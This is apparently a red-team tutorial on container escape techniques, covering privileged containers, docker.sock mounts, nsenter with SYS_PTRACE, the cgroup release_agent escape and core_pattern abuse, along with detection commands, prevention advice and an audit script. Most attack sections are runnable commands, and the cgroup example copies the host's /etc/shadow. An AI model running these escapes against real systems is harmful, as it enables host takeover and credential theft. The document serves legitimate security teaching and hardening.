# Container Escape Techniques: What Red Teamers Actually Check

Containers are not VMs. Here are the real escape vectors that matter in pentests and CTFs — and how to detect/prevent them.

## 1. Privileged Containers (The Easy Win)

A `--privileged` container has ALL Linux capabilities and access to host devices:

```bash
# Check if you're in a privileged container
cat /proc/1/status | grep -i cap
# CapEff: 000001ffffffffff  <- all caps = privileged

# Escape via mounting host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
# You're now root on the host
```

**Detection:**
```bash
# On the host, find privileged containers
docker inspect --format='{{.HostConfig.Privileged}}' $(docker ps -q)
```

**Prevention:** Never use `--privileged`. Use `--cap-drop ALL --cap-add <specific>`.

## 2. Docker Socket Mount Escape

If `/var/run/docker.sock` is mounted inside the container:

```bash
# Check for docker socket access
ls -la /var/run/docker.sock

# Create a new privileged container with host root mounted
docker run -v /:/hostfs -it --privileged alpine chroot /hostfs sh
```

**Prevention:**
```yaml
# In Kubernetes, block hostPath mounts via Pod Security Standards
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
spec:
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'secret'
    # Notably absent: 'hostPath'
```

## 3. Sensitive Capability Abuse — CAP_SYS_PTRACE

With `SYS_PTRACE`, you can inject into host processes if PID namespace isn't isolated:

```bash
# Find a host process (requires --pid=host)
ps aux | grep root

# Inject via nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

## 4. cgroups v1 Release Agent Escape

Works in containers with cgroup write access (common in older Docker configs):

```bash
# Requires: CAP_SYS_ADMIN or writable cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release

# Set release agent to a script that runs on the HOST
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd

# Trigger the release agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output  # host's /etc/shadow
```

## 5. Core Pattern Escape

Writable `/proc/sys/kernel/core_pattern` can execute arbitrary commands on the host:

```bash
# Check if writable (requires CAP_SYS_ADMIN)
echo "|/path/to/malicious_script" > /proc/sys/kernel/core_pattern
# Trigger a core dump -> host executes the script
```

## Quick Audit Checklist

```bash
#!/bin/bash
echo "=== Container Escape Audit ==="
echo "[*] Capabilities: $(cat /proc/1/status | grep CapEff)"
echo "[*] Docker socket: $(ls /var/run/docker.sock 2>/dev/null && echo FOUND || echo safe)"
echo "[*] Privileged: $(ip link add test0 type dummy 2>/dev/null && echo YES || echo no)"
echo "[*] Host PID NS: $(ls /proc/1/root/etc/hostname 2>/dev/null && echo POSSIBLY || echo no)"
echo "[*] Host network: $(ip addr | grep -c docker0 && echo YES || echo no)"
```

## Key Takeaway

The most common escapes in the wild are privileged containers and docker.sock mounts. Use Kubernetes Pod Security Standards (restricted profile), drop all capabilities, and audit with tools like `amicontained` or Falco.